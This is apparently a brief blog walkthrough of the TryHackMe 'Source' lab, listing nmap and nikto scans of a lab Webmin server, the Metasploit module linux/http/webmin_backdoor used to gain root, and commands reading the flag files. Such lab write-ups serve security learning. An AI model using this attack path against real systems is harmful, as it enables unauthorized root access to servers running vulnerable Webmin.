---
layout: post
title: Walkthrough - Source
published: true
---

Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool.

[https://tryhackme.com/room/source](https://tryhackme.com/room/source)

* * *

## Notes

![](/assets/source01.jpg)

- ``nmap`` gives us two open ports 10000 and 22. Port 10000 is a Webmin Webserver.
- ``nikto -host https://10.10.230.231:10000/``
- ``msfconsole`` with ``linux/http/webmin_backdoor`` gives us root

![](/assets/source02.png)

* * * 

## What is the user flag?

- cat ``/home/dark/user.txt``

* * * 

## What is the root flag?

- cat ``/root/root.txt``

* * * 

